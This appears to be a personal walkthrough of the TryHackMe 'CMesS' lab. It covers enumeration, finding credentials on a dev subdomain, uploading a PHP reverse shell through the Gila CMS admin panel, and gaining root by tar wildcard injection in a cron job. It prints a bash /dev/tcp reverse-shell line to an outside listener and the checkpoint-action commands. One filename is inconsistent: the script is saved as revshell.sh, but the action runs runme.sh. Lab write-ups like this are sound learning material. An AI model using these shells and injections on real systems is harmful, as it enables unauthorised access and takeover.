[+] CMesS

#### IP Address

```bash
EXPORT IP=10.10.194.54
```

## Nmap

Ports open:
- 22 - ssh (7.2p2) **Ubuntu**
- 80
    - Apache 2.4.18
    - Gila CMS
    - 3 disallowed entries via robots.txt

## Ffuf

/index
/blog - same as index
/about
/search
/login
/1 - lists of blog posts/where i think they're stored?
/category
/01
/themes - no access
/feed
/api
/001
/1pix
/fm
/tmp
/1a

Checking subdomains

## Initial thoughts

Says it's Gila CMS, wonder if it's vulnerable to anything off the bat.

Was not able to get any of the CVE's found in searchsploit to work.

After some digging around, I found nothing and ended up having to use the hint on THM. Told me to search for subdomains which is something I hadn't even thought of (I hadn't setup the proper domain in /etc/hosts)

After adding that, and some messing around with Ffuf I was able to find something.

Using ffuf:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" -fw 522
```

I used -fw 522 as I was getting a ton of results, all with a wordcount of 522. I had a feeling that this was because they were all redirecting to a specific spot. Because of this, I found the "dev" subdomain.

This contained the user "andre" and the password "KPFTN_f2yxe%"

I first attempted to login to ssh using this username/password but was unsuccessful, so I went ahead and logged into the /admin page with this and **it worked**

## Web access

As I was logged into the /admin page, I was looking around and found a lot of information about the server itself (what versions of everything that were running)

Additionally, I found an upload portal. First thought was to upload a php reverse shell as that was what was running, and was able to upload it.

It upload into cmess.thm/access/revshell.php. I was able to get a reverse shell from this.

Once I had access, I spun up a python3 http.server to transfer over linpeas.

After running linpeas, it found a password.bak file in /opt/, this contained the user Andre's password. This allowed me to login via ssh.

Once I was logged into Andre via SSH, I still had my original shell open with linpeas to check back with. I was looking through and saw that one of the crontabs had a wildcard with it.

I was able to create a reverse shell by abusing tar arguments as follows from within the directory the tar backup was looking for:


First, I created my revshell file:
```bash
echo 'bash -i >& /dev/tcp/10.2.110.157/9999 0>&1' > revshell.sh

chmod +x revshell.sh
```


Next, I created arguments (files) that tar would look for and run my revshell.sh script
```bash
touch /home/andre/backup/--checkpoint=1

touch /home/andre/backup/--checkpoint-action=exec=sh\ runme.sh
```

Had a lot of trouble getting the syntax for the second touch command to work properly, but once I had it all I had to do was wait with a netcat listener and I got root.
